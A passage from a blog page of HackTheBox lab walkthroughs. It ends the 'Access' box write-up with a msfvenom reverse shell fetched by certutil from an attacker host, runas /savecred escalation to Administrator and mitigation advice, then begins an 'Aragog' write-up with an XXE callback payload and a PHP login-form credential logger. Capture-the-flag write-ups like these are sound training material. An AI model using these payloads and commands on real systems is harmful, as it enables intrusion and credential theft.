25,<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#e6db74">&#34;admin&#34;</span>,1,<span style="color:#e6db74">&#34;08/23/18 21:11:47&#34;</span>,26,
27,<span style="color:#e6db74">&#34;engineer&#34;</span>,<span style="color:#e6db74">&#34;access4u@security&#34;</span>,1,<span style="color:#e6db74">&#34;08/23/18 21:13:36&#34;</span>,26,
28,<span style="color:#e6db74">&#34;backup_admin&#34;</span>,<span style="color:#e6db74">&#34;admin&#34;</span>,1,<span style="color:#e6db74">&#34;08/23/18 21:14:02&#34;</span>,26,</code></pre></div>
<p><em>Cha-ching</em> - I have password - checking it agains the archive yields success:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╭─root@warmachine ~/hackthebox/access
╰─# 7z e <span style="color:#e6db74">&#39;Access Control.zip&#39;</span>    </code></pre></div>
<p>and use <code>access4u@security</code> as password</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╭─root@warmachine ~/hackthebox/access  
╰─# readpst Access<span style="color:#ae81ff">\ </span>Control.pst

The password <span style="color:#66d9ef">for</span> the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.</code></pre></div>
<p>Now I have another user and password: <code>security/4Cc3ssC0ntr0ller</code>. Having seen the login prompt on the <code>telnet</code> service (and the lack of interesting stuff on the http end) I decided to try the credentials there. Well it worked and I got user access :)</p>
<h2 id="2-gaining-footholdlow-priv-user">2. Gaining foothold/low priv user</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╭─root@warmachine ~/hackthebox/access
╰─# telnet 10.10.10.98 <span style="color:#ae81ff">23</span>                                                                           <span style="color:#ae81ff">1</span> ↵
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is <span style="color:#e6db74">&#39;^]&#39;</span>.
Welcome to Microsoft Telnet Service

login: security
password:

*<span style="color:#f92672">===============================================================</span>
Microsoft Telnet Server.
*<span style="color:#f92672">===============================================================</span>
C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>ecurity&gt; type C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>ecurity<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\u</span>ser.txt
&lt;...&gt;

C:<span style="color:#ae81ff">\&gt;</span>systeminfo                            
                                          
Host Name:                 ACCESS         
OS Name:                   Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 Standard
OS Version:                6.1.7600 N/A Build <span style="color:#ae81ff">7600</span></code></pre></div>
<h2 id="3-enumerating-the-system">3. Enumerating the system</h2>
<p>Before starting the enumeration I tried creating and executing a rev shell (made with metasploit), but failed - guess I have to escalate before getting rid of the telnet :(</p>
<p>After some time poking here and there (the usual stuff - <a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a> etc.) and failing to find useful stuff I found an interesting shortcut for <code>ZKAccess3.5 Security System</code> in the <code>Public</code> user&rsquo;s <code>Desktop</code> and after inspecting it it looks like someone decided it&rsquo;s a good idea to use <code>runas</code> (with saved credentials(!)) for giving access to unprivileged user (without providing authentication)&hellip; wut?! Doing additional checks confirms it:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cmdkey /list
Currently stored credentials:
Target: Domain:interactive<span style="color:#f92672">=</span>ACCESS<span style="color:#ae81ff">\A</span>dministrator Type: Domain Password
User: ACCESS<span style="color:#ae81ff">\A</span>dministrator</code></pre></div>
<blockquote>
<p>/savecred: Saves the password so it has to be entered only the first time the RunAs command is used.</p>
</blockquote>
<blockquote>
<p>The /savecred parameter is an extremely bad idea, as it creates a gaping security hole. In short, once you’ve used /savecred, any user at the computer can use the RunAs command to run any program with administrator privileges.</p>
</blockquote>
<p>So let&rsquo;s try and run the shell we coudn&rsquo;t before:</p>
<h2 id="4-escalating-privileges">4. Escalating privileges</h2>
<ol>
<li>Create the shell (exe) on my Kali VM:</li>
</ol>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.22 LPORT=4747 -f exe &gt; shell.exe</code></p>
<ol start="2">
<li>Download it on Access via <code>certutil</code> (have to be in a directory you can write to ;)):</li>
</ol>
<p><code>certutil.exe -urlcache -split -f &quot;http://10.10.14.22:8000/shell.exe&quot; shell.exe</code></p>
<ol start="3">
<li>Setup <code>msfconsole</code> on my Kali VM so there is something to listen for the reverse shell:</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; use exploit/multi/handler                                                                                                                                   
msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set payload windows/meterpreter/reverse_tcp                                                                          
payload <span style="color:#f92672">=</span>&gt; windows/meterpreter/reverse_tcp                                                                                                           
msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set lhost 10.10.14.22                                                                                       
lhost <span style="color:#f92672">=</span>&gt; 10.10.14.22                                                                                                                                 
msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set lport <span style="color:#ae81ff">4747</span>                                                                                                       
lport <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">4747</span>                                                                                                                                                              
msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set ExitOnSession false                                                                                      
ExitOnSession <span style="color:#f92672">=</span>&gt; false                                                                                                                           
msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; exploit -j                                                                                                                            
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit running as background job 0.                                                                                                                         
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit completed, but no session was created.                                                                                                                            
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.22:4747</code></pre></div>
<ol start="4">
<li>Execute <code>shell.exe</code> as <code>Administrator</code> via <code>runas</code>:</li>
</ol>
<p><code>C:\Users\security&gt;runas /savecred /user:ACCESS\Administrator shell.exe</code></p>
<ol start="5">
<li>Check your metasploit sessions and check your access:</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">179779</span> bytes<span style="color:#f92672">)</span> to 10.10.10.98                                                                           
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.22:4747 -&gt; 10.10.10.98:49159<span style="color:#f92672">)</span> at 2019-02-25 21:11:56 +0200

msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; sessions                                                                                       
Active sessions                                 
<span style="color:#f92672">===============</span>                                                                                                    
  Id  Name  Type                     Information                    Connection                                     
  --  ----  ----                     -----------                    ----------                                     
  <span style="color:#ae81ff">1</span>         meterpreter x86/windows  ACCESS<span style="color:#ae81ff">\A</span>dministrator @ ACCESS  10.10.14.22:4747 -&gt; 10.10.10.98:49159 <span style="color:#f92672">(</span>10.10.10.98<span style="color:#f92672">)</span>                                               
msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; sessions -i <span style="color:#ae81ff">1</span>                        
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting interaction with 1...      

meterpreter &gt; sysinfo
Computer        : ACCESS
OS              : Windows <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>Build 7600<span style="color:#f92672">)</span>.
Architecture    : x64
System Language : en_US
Domain          : HTB
Logged On Users : <span style="color:#ae81ff">4</span>
Meterpreter     : x86/windows</code></pre></div>
<ol start="6">
<li>Profit :)</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; ls
Listing: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop
<span style="color:#f92672">=======================================</span>

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  <span style="color:#ae81ff">282</span>   fil   2018-08-21 23:43:14 +0300  desktop.ini
100666/rw-rw-rw-  <span style="color:#ae81ff">32</span>    fil   2018-08-22 01:07:24 +0300  root.txt

meterpreter &gt; cat root.txt
&lt;...&gt;</code></pre></div>
<h2 id="5-mitigations">5. Mitigations</h2>
<h3 id="user">User</h3>
<p>Well this should be no brainer: under no circumstances save credentials on public share :) Don&rsquo;t do this with backups either :D As we are at it - don&rsquo;t store user passwords in plaintext, aaand.. don&rsquo;t send sensitive data in plaintext mails ;)</p>
<blockquote>
<p>Use save communication channels for sending sensitive data (the mail was in clear text, it&rsquo;s archive was password protected)</p>
</blockquote>
<blockquote>
<p>Don&rsquo;t store passwords in plaintext in databases</p>
</blockquote>
<blockquote>
<p>Don&rsquo;t store backups on public shares</p>
</blockquote>
<h3 id="root">Root</h3>
<p>On RunAs - it&rsquo;s a useful tool, but the <code>/savecred</code> option makes it a serious security hole. This gives <strong>every</strong> user on the machine a way to run <strong>everything</strong> he wants to as <code>Administrator</code></p>
<blockquote>
<p>Don&rsquo;t user the <code>/savecred</code> option on <code>RunAs</code></p>
</blockquote>


				</div>
				
				<div class="post">

					<div class="post-heading">
						<h1><a href="https://www.offsec.dev/posts/aragog/">HackTheBox - Aragog Walkthrough</a></h1>
						<span>Jul 26, 2018</span>
					</div>

					<p><img src="https://monsterlegacy.files.wordpress.com/2017/02/aragogbeauty.jpg" alt="Aragog"></p>
<h2 id="1-recon-and-information-gathering">1. Recon and Information gathering</h2>
<p>Machine name: Aragog<br>
IP: 10.10.10.78<br>
OS: Linux</p>
<h3 id="nmap">Nmap</h3>
<p><code>nmap -A 10.10.10.78 -oN base.nmap</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.78
Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">997</span> closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
|_-r--r--r--    <span style="color:#ae81ff">1</span> ftp      ftp            <span style="color:#ae81ff">86</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2017</span> test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.8
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was <span style="color:#ae81ff">5</span>
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> ad:21:fb:50:16:d4:93:dc:b7:29:1f:4c:c2:61:16:48 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 2c:94:00:3c:57:2f:c2:49:77:24:aa:22:6a:43:7d:b1 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> 9a:ff:8b:e4:0e:98:70:52:29:68:0e:cc:a0:7d:5c:1f <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Thu Jul  5 14:34:23 2018 -- 1 IP address (1 host up) scanned in 12.46 seconds</span></code></pre></div>
<h3 id="ssh">SSH</h3>
<p>SSH is running on default port with no additional interesting information from the scan. On connecting we can see that it only takes ssh key authentication and doesn&rsquo;t accept passwords:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh root@10.10.10.78
root@10.10.10.78: Permission denied <span style="color:#f92672">(</span>publickey<span style="color:#f92672">)</span>.</code></pre></div>
<h3 id="ftp">FTP</h3>
<p>Quick check on the version doesn&rsquo;t show any vulns available, but we have a file and anonymous access to that file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;details&gt;</span>
    <span style="color:#f92672">&lt;subnet_mask&gt;</span>255.255.255.192<span style="color:#f92672">&lt;/subnet_mask&gt;</span>
    <span style="color:#f92672">&lt;test&gt;&lt;/test&gt;</span>
<span style="color:#f92672">&lt;/details&gt;</span></code></pre></div>
<p>So far that&rsquo;s all we have/can do with the ftp so we continue with the exposed services.</p>
<h3 id="http">HTTP</h3>
<p>Fist let&rsquo;s see what is available at / on the webserver:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl 10.10.10.78 -s | grep title
&lt;title&gt;Apache2 Ubuntu Default Page: It works&lt;/title&gt;</code></pre></div>
<p>Nothing interesting, just the default webpage for Ubuntu&rsquo;s Apache installations. Next step - dirbusting. We&rsquo;ll start with a small list and some basic extensions - if we don&rsquo;t find anything interesting we can expand the search with bigger wordlist:</p>
<p><code>gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.78 -t 50 -x txt,php,xml</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Gobuster v1.4.1              OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span>
<span style="color:#f92672">=====================================================</span>
<span style="color:#f92672">=====================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Mode         : dir
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url/Domain   : http://10.10.10.78/
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads      : <span style="color:#ae81ff">50</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist     : /usr/share/wordlists/dirb/common.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes : 200,204,301,302,307
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions   : .txt,.php,.xml
<span style="color:#f92672">=====================================================</span>
/hosts.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/index.html <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
---------------------------------------</code></pre></div>
<p>Only one php file found with that list. The content:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl http://10.10.10.78/hosts.php

There are <span style="color:#ae81ff">4294967294</span> possible hosts <span style="color:#66d9ef">for</span> </code></pre></div>
<p>Looking at the output and seeing <code>4294967294</code> and <code>possible hosts</code> should lead our train of thought to ip4 addresses (at least did that for me):</p>
<blockquote>
<p>IPv4 uses 32-bit IP address, and with 32 bits the maximum number of IP addresses is 232—or 4,294,967,296.</p>
</blockquote>
<p>Adding one IP for broadcast and one for network results in the same number of hosts. Checking back our test.txt and seeing a network mask there should be our next pointer - let&rsquo;s use them together:</p>
<p><code>curl -X POST http://10.10.10.78/hosts.php -d @text.txt</code></p>
<p>Which calculates the possible hosts for the provided netmask:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl output</code></pre></div>
<p>So we now know how to interact with the application. Since we have XML input our first check should be for possible XXE (XML External Entity)</p>
<h2 id="2-vulnerability-testing">2. Vulnerability Testing</h2>
<p>As a start let&rsquo;s run a python webserver on our attacking machine:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python -m SimpleHTTPServer <span style="color:#ae81ff">80</span>
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> ...</code></pre></div>
<p>And let&rsquo;s create a file with our payload for testing the app - we&rsquo;ll call it <code>xxe_test.xml</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;</span>
<span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;http://OUR.ATTACK.MACHINE.IP&#34; &gt;</span>]&gt;
<span style="color:#f92672">&lt;details&gt;</span>
    <span style="color:#f92672">&lt;subnet_mask&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/subnet_mask&gt;</span>
    <span style="color:#f92672">&lt;test&gt;&lt;/test&gt;</span>
<span style="color:#f92672">&lt;/details&gt;</span></code></pre></div>
<p>Send it to the webapp via curl request:</p>
<p><code>curl http://10.10.10.78/hosts.php -X POST -d @xxe_test.txt</code></p>
<p>check our python server and see if we have a callback:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">There are <span style="color:#ae81ff">4294967294</span> possible hosts <span style="color:#66d9ef">for</span> 

10.10.10.78 - - <span style="color:#f92672">[</span>29/Jul/2018 03:07:19<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET / HTTP/1.0&#34;</span> <span style="color:#ae81ff">200</span> -</code></pre></div>
<p>Bingo! We have a way of executing things on the remove machine. Let&rsquo;s see what exactly is available to us.</p>
<ul>
<li>XXE testing</li>
<li>XXE fixes/avoidance</li>
</ul>
<h2 id="3-exploitation">3. Exploitation</h2>
<ul>
<li>XXE exploitation</li>
<li>Gaining user access</li>
</ul>
<h2 id="4-privilege-escalation">4. Privilege Escalation</h2>
<ul>
<li>Internal enumeration</li>
<li>Wordpress</li>
<li>Permissions</li>
<li>Getting admin credentials through logging Wordpress login form</li>
<li>r00tz</li>
</ul>
<p>Edit wp-login.php:</p>
<p><code>vim /home/myserverlab/public_html/logger/wp-login.php</code></p>
<p>Output:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
$entityBody <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;php://input&#39;</span>);
<span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#39;admin.logger&#39;</span>, $entityBody <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</code></pre></div>


				</div>
				

				<div class="text-center">
					

<ul class="pagination">
    
    <li class="page-item">
        <a href="https://www.offsec.dev/posts/" class="page-link" aria-label="First"><span aria-hidden="true">&laquo;&laquo;</span></a>
    </li>
    
    <li class="page-item">
    <a href="https://www.offsec.dev/posts/page/2/" class="page-link" aria-label="Previous"><span aria-hidden="true">&laquo;</span></a>
    </li>
    
    
    
    
    
    
    
        
        
    
    
    <li class="page-item"><a class="page-link" href="https://www.offsec.dev/posts/">1</a></li>
    
    
    
    
    
    
        
        
    
    
    <li class="page-item"><a class="page-link" href="https://www.offsec.dev/posts/page/2/">2</a></li>
    
    
    
    
    
    
        
        
    
    
    <li class="page-item active"><a class="page-link" href="https://www.offsec.dev/posts/page/3/">3</a></li>
    
    
    <li class="page-item disabled">
    <a  class="page-link" aria-label="Next"><span aria-hidden="true">&raquo;</span></a>
    </li>
    
    <li class="page-item">
        <a href="https://www.offsec.dev/posts/page/3/" class="page-link" aria-label="Last"><span aria-hidden="true">&raquo;&raquo;</span></a>
    </li>
    
</ul>


				</div>

			</div>
			<div class="col-sm-1 col-md-3 col-md-4">
			</div>
		</div>
	</div>



<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-166758470-1', 'auto');
	
	ga('send', 'pageview');
}
</script>



<script  src="https://www.offsec.dev/js/canvas.js"></script>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>

<script src="https://www.offsec.dev/js/bootstrap.min.js"></script>
<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="offsec" data-description="If you like this content" data-message="Thank you for visiting. You can now buy me a coffee!" data-color="#FF813F" data-position="right" data-x_margin="10" data-y_margin="10"></script>
</body>
</html>
